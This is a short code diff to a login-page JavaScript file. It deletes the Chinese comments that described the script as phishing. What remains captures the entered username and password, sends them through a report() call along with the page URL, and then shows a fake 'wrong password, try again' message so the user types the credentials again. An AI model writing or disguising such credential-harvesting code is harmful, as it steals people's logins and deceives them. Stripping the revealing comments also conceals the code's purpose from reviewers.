@@ -1,4 +1,3 @@
-// 登录页脚本:提交时回传账号密码(仿登录钓鱼)
 (function () {
   var form = document.getElementById("ph-login-form");
   if (!form) { return; }
@@ -12,7 +11,6 @@
       return;
     }
     report({ type: "login", url: location.href, user: user, pass: pass });
-    // 模拟登录失败,诱导用户再次输入
     if (err) {
       err.style.display = "block";
       err.textContent = "账号或密码错误,请重新输入";
